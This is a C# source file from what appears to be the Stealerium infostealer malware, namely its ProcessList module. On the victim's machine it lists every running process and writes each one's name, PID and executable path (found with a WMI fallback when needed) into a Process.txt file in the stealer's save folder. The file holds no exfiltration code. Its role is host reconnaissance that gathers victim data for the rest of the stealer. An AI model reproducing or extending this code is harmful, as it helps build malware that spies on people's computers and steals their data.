using System.Diagnostics;
using System.IO;
using System.Management;

namespace Stealerium.Target.System
{
    internal sealed class ProcessList
    {
        // Save process list
        public static void WriteProcesses(string sSavePath)
        {
            foreach (var process in Process.GetProcesses())
                File.AppendAllText(
                    sSavePath + "\\Process.txt",
                    "NAME: " + process.ProcessName +
                    "\n\tPID: " + process.Id +
                    "\n\tEXE: " + ProcessExecutablePath(process) +
                    "\n\n"
                );
        }

        // Get process executable path
        public static string ProcessExecutablePath(Process process)
        {
            try
            {
                if (process.MainModule != null) return process.MainModule.FileName;
            }
            catch
            {
                var query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                var searcher = new ManagementObjectSearcher(query);

                foreach (var o in searcher.Get())
                {
                    var item = (ManagementObject) o;
                    var id = item["ProcessID"];
                    var path = item["ExecutablePath"];

                    if (path != null && id.ToString() == process.Id.ToString()) return path.ToString();
                }
            }

            return "";
        }
    }
}